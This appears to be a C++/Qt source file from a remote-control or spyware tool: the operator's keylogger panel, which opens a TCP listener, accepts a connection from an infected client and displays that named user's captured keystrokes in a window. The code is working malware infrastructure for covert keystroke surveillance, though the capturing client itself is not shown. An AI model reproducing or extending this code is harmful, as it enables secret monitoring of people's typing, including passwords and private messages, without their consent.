#include "keybd.h"

Keybd::Keybd(QWidget *parent) : QWidget(parent)
{
    // 初始化窗口
    const int w = 600, h = 400;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - h) >> 1;
    this->setGeometry(x, y, w, h);

    // 设置文本框
    mEdit = new QTextEdit(this);
    mEdit->setGeometry(0,0,w,h);
    mEdit->setReadOnly(true);
}

// 开始监控服务器，然后返回新的端口号
int Keybd::startKeybdServer(QString userName){
    // 设置窗口标题
    this->setWindowTitle(userName.append("-键盘监听"));

    // 开启新的服务端
    mServer = new TcpServer(this);
    connect(mServer,SIGNAL(newConnection(QTcpSocket*)), this,SLOT(newConnection(QTcpSocket*)));

    mServer->start(0);
    if (!mServer->server()->isListening()) {
        qDebug() << "开启键盘监控服务端失败";
        deleteLater();
        return -1;
    }

    // 开启监控窗口
    this->show();

    return mServer->server()->serverPort();
}

void Keybd::newConnection(QTcpSocket *s)
{
    // 新增客户
    mSock = new TcpSocket(s, this);
    connect(mSock,SIGNAL(newData()), this, SLOT(processBuffer()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(deleteLater()));

    // 不再监听新客户
    mServer->server()->close();
}

void Keybd::processBuffer()
{
    // 将数据打印到文本框
    // 针对GBK的解码
    // 运用了append 会自带一个换行符
    // 由于客户端固定时间发送一次
    // 因此 连敲的按键不会多换一行 会连着显示
    mEdit->append(codec->toUnicode(*mSock->buffer()));

    // 清空缓冲区
    mSock->buffer()->clear();
}

void Keybd::resizeEvent(QResizeEvent *)
{
    mEdit->setGeometry(0,0,width(), height());
}

void Keybd::closeEvent(QCloseEvent *)
{
    // 删除窗口
    deleteLater();
}
